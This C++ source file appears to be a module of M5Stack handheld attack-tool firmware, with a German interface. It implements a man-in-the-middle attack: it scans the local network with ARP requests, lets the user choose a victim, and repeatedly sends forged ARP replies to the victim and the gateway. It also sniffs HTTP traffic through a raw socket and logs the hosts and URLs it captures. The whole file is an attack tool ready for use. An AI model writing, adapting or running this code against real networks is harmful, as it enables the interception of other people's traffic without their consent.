#include "mitm_attack.h"
#include "config.h"
#include "settings.h"
#include "keyboard.h"
#include "ui.h"
#include "menu.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <lwip/netif.h>
#include <lwip/etharp.h>
#include <lwip/ip4_addr.h>
#include <lwip/raw.h>
#include <lwip/ip.h>
#include <lwip/tcp.h>
#include <lwip/prot/tcp.h>
#include <lwip/pbuf.h>
#include <vector>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

typedef struct {
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t  hw_len;
    uint8_t  proto_len;
    uint16_t opcode;
    uint8_t  sender_mac[6];
    uint8_t  sender_ip[4];
    uint8_t  target_mac[6];
    uint8_t  target_ip[4];
} __attribute__((packed)) arp_pkt_t;

struct DeviceEntry {
    uint8_t  mac[6];
    IPAddress ip;
};

static std::vector<DeviceEntry> devices;

static volatile bool spoofingRunning = false;
static uint8_t attackerMac[6];
static uint8_t gatewayMac[6];
static IPAddress gatewayIP;
static DeviceEntry targetDevice;

static std::vector<String> httpLog;
static const int MAX_LOG_LINES = 20;

static void logHTTP(const String &host, const String &url) {
    String entry = host + url;
    if (entry.length() > 50) entry = entry.substring(0, 47) + "...";
    httpLog.push_back(entry);
    if (httpLog.size() > MAX_LOG_LINES) httpLog.erase(httpLog.begin());
}

static void arpSpoofTask(void *pv) {
    
    arp_pkt_t pkt;
    memset(&pkt, 0, sizeof(pkt));
    pkt.hw_type = htons(1);          
    pkt.proto_type = htons(0x0800);  
    pkt.hw_len = 6;
    pkt.proto_len = 4;
    pkt.opcode = htons(2);           

    
    memcpy(pkt.sender_mac, attackerMac, 6);

    while (spoofingRunning) {
        
        memcpy(pkt.sender_ip, &gatewayIP, 4);         
        memcpy(pkt.target_mac, targetDevice.mac, 6);   
        memcpy(pkt.target_ip, (uint8_t*)&targetDevice.ip, 4); 
        esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);

        
        memcpy(pkt.sender_ip, (uint8_t*)&targetDevice.ip, 4); 
        memcpy(pkt.target_mac, gatewayMac, 6);        
        memcpy(pkt.target_ip, &gatewayIP, 4);          
        esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);

        vTaskDelay(pdMS_TO_TICKS(2000));  
    }
    vTaskDelete(NULL);
}

static u8_t rawReceiveCallback(void *arg, struct raw_pcb *pcb, struct pbuf *p,
                               const ip_addr_t *addr) {
    if (p->len < 20) {
        pbuf_free(p);
        return 0; 
    }

    
    uint8_t *payload = (uint8_t*)p->payload;
    uint8_t ihl = (payload[0] & 0x0F) * 4;
    if (p->len < ihl + 20) {
        pbuf_free(p);
        return 0;
    }

    uint8_t *tcp = payload + ihl;
    uint16_t srcPort = (tcp[0] << 8) | tcp[1];
    uint16_t dstPort = (tcp[2] << 8) | tcp[3];

    
    if (srcPort != 80 && dstPort != 80) {
        pbuf_free(p);
        return 0;
    }

    uint8_t tcpHdrLen = ((tcp[12] & 0xF0) >> 4) * 4;
    uint8_t *httpData = tcp + tcpHdrLen;
    int httpLen = p->len - (ihl + tcpHdrLen);
    if (httpLen <= 0) {
        pbuf_free(p);
        return 0;
    }

    
    String chunk((char*)httpData, httpLen);
    chunk.toLowerCase();
    int hostIdx = chunk.indexOf("host: ");
    if (hostIdx >= 0) {
        int endIdx = chunk.indexOf("\r\n", hostIdx);
        if (endIdx > hostIdx) {
            String host = chunk.substring(hostIdx + 6, endIdx);
            
            int methodEnd = chunk.indexOf(' ');
            if (methodEnd > 0) {
                int urlEnd = chunk.indexOf(' ', methodEnd + 1);
                if (urlEnd > methodEnd) {
                    String url = chunk.substring(methodEnd + 1, urlEnd);
                    logHTTP(host, url);
                }
            }
        }
    }

    
    
    
    
    pbuf_free(p);
    return 0; 
}

static struct raw_pcb *rawPcb = nullptr;

static bool startForwardingAndSniffing() {
    
    rawPcb = raw_new(IP_PROTO_TCP);
    if (!rawPcb) return false;
    raw_recv(rawPcb, rawReceiveCallback, NULL);
    
    raw_bind(rawPcb, IP_ADDR_ANY);
    return true;
}

static bool arpScan() {
    devices.clear();
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Nicht mit WiFi verbunden", true);
        return false;
    }

    struct netif *netif = netif_find("st1");
    if (!netif) {
        displayError("lwip netif nicht gefunden", true);
        return false;
    }

    IPAddress localIP = WiFi.localIP();
    IPAddress subnet  = WiFi.subnetMask();
    uint32_t ip_u32   = (uint32_t)localIP[0] << 24 | localIP[1] << 16 | localIP[2] << 8 | localIP[3];
    uint32_t mask_u32 = (uint32_t)subnet[0] << 24 | subnet[1] << 16 | subnet[2] << 8 | subnet[3];
    uint32_t network  = ip_u32 & mask_u32;
    uint32_t hostmask = ~mask_u32;
    int totalIPs = hostmask - 1;
    if (totalIPs > 254) totalIPs = 254;
    if (totalIPs < 1) totalIPs = 1;

    M5.Display.fillScreen(kitenConfig.bgColor);
    drawMainBorder(false);
    M5.Display.setTextSize(FP);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y);
    M5.Display.print("ARP-Scan laeuft...");

    for (uint32_t host = 1; host <= totalIPs; host++) {
        uint32_t ip_raw = network | host;
        IPAddress targetIP(
            (ip_raw >> 24) & 0xFF,
            (ip_raw >> 16) & 0xFF,
            (ip_raw >> 8) & 0xFF,
            ip_raw & 0xFF
        );
        if (targetIP == localIP) continue;

        ip4_addr_t ip4;
        IP4_ADDR(&ip4, targetIP[0], targetIP[1], targetIP[2], targetIP[3]);
        etharp_request(netif, &ip4);

        if (host % 25 == 0 || host == 1) {
            M5.Display.fillRect(0, BORDER_PAD_Y + LH*FP + 4,
                                SCREEN_WIDTH, 20, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y + LH*FP + 4);
            int pct = (host * 100) / totalIPs;
            M5.Display.printf("Scanne... %d%%", pct);
            M5.update();
        }

        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            displayWarning("Abgebrochen", true);
            return false;
        }
        delay(2);
    }

    delay(1500);

    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_ret = nullptr;
        struct netif *netif_ret = nullptr;
        struct eth_addr *eth_ret = nullptr;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret)) {
            if (netif_ret == netif && ip_ret) {
                DeviceEntry dev;
                memcpy(dev.mac, &eth_ret->addr, 6);
                dev.ip = IPAddress(ip_ret->addr);
                if (dev.ip != localIP) {
                    devices.push_back(dev);
                }
            }
        }
    }

    return true;
}

static bool selectTarget() {
    if (devices.empty()) {
        displayWarning("Keine Geraete gefunden", true);
        return false;
    }

    std::vector<Option> opts;
    for (auto &d : devices) {
        String label = d.ip.toString();
        opts.push_back({label, [d]() { targetDevice = d; }});
    }
    addBackItem(opts);
    int sel = loopOptions(opts, MENU_TYPE_REGULAR, "Ziel waehlen");
    return (sel >= 0 && sel < (int)devices.size());
}

static void startMITM() {
    if (!selectTarget()) return;

    
    gatewayIP = WiFi.gatewayIP();
    
    struct netif *netif = netif_find("st1");
    ip4_addr_t gw_ip4;
    IP4_ADDR(&gw_ip4, gatewayIP[0], gatewayIP[1], gatewayIP[2], gatewayIP[3]);
    struct eth_addr *eth_ret = nullptr;
    bool found = false;
    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_ret = nullptr;
        struct netif *netif_ret = nullptr;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret)) {
            if (ip4_addr_cmp(ip_ret, &gw_ip4)) {
                memcpy(gatewayMac, &eth_ret->addr, 6);
                found = true;
                break;
            }
        }
    }
    if (!found) {
        displayError("Gateway-MAC nicht gefunden", true);
        return;
    }

    
    esp_read_mac(attackerMac, ESP_MAC_WIFI_STA);

    
    if (!startForwardingAndSniffing()) {
        displayError("Sniffer konnte nicht gestartet werden", true);
        return;
    }

    
    spoofingRunning = true;
    httpLog.clear();
    xTaskCreatePinnedToCore(arpSpoofTask, "arpSpoof", 4096, NULL, tskIDLE_PRIORITY+2, NULL, 1);

    
    unsigned long startMs = millis();
    unsigned long lastStat = startMs;
    M5.Display.fillScreen(kitenConfig.bgColor);
    while (spoofingRunning) {
        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            spoofingRunning = false;
            uiBeep(440, 30);
            waitAllKeysReleased();
            break;
        }

        if (millis() - lastStat >= 500) {
            lastStat = millis();
            unsigned long elapsed = millis() - startMs;

            M5.Display.fillScreen(kitenConfig.bgColor);
            drawMainBorder(false);
            M5.Display.setTextSize(FM);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y);
            M5.Display.print("MITM ATTACK");
            M5.Display.drawFastHLine(BORDER_PAD_X, BORDER_PAD_Y + LH*FM + 2,
                                     SCREEN_WIDTH - 2*BORDER_PAD_X, kitenConfig.secColor);
            int y = BORDER_PAD_Y + LH*FM + 6;
            M5.Display.setTextSize(FP);
            M5.Display.setTextColor(TFT_WHITE, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, y); y+=LH*FP+2;
            M5.Display.print("Opfer: " + targetDevice.ip.toString());
            M5.Display.setCursor(BORDER_PAD_X, y); y+=LH*FP+2;
            M5.Display.print("Gateway: " + gatewayIP.toString());
            M5.Display.setCursor(BORDER_PAD_X, y); y+=LH*FP+2;
            M5.Display.print("Elapsed: " + String(elapsed/1000) + "s");
            M5.Display.setCursor(BORDER_PAD_X, y); y+=LH*FP+2;
            M5.Display.print("--- HTTP Log ---");

            
            int linesShown = 0;
            for (int i = httpLog.size()-1; i >= 0 && linesShown < 4; i--) {
                if (y > SCREEN_HEIGHT - 15) break;
                M5.Display.setCursor(BORDER_PAD_X, y);
                M5.Display.print(httpLog[i]);
                y += LH*FP+2;
                linesShown++;
            }

            y += LH*FP+4;
            M5.Display.setTextColor(TFT_RED, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, SCREEN_HEIGHT - LH*FP - 4);
            M5.Display.print("[ESC] Stop");
        }
        markActivity();
        delay(5);
    }

    
    spoofingRunning = false;
    if (rawPcb) {
        raw_remove(rawPcb);
        rawPcb = nullptr;
    }
    unsigned long totalMs = millis() - startMs;
    displayInfo("MITM beendet.\n" + String(httpLog.size()) + " HTTP-Requests in " +
                String(totalMs/1000) + "s", true);
}

void mitmAttackMenuEntry() {
    int sel = 0;
    std::vector<Option> opts;
    for (;;) {
        opts.clear();
        opts.push_back({"Netzwerk scannen", []() {
            if (WiFi.status() != WL_CONNECTED) {
                displayError("Bitte zuerst mit WiFi verbinden.", true);
                return;
            }
            if (arpScan()) {
                String msg = String(devices.size()) + " Geraete gefunden.";
                displayInfo(msg, true);
            }
        }});
        opts.push_back({"MITM starten", []() {
            if (devices.empty()) {
                displayWarning("Keine Geraete gescannt. Zuerst scannen.", true);
                return;
            }
            startMITM();
        }});
        addBackItem(opts);
        sel = loopOptions(opts, MENU_TYPE_REGULAR, "MITM Attack");
        if (sel == -1 || sel == (int)opts.size()-1) return;
    }
}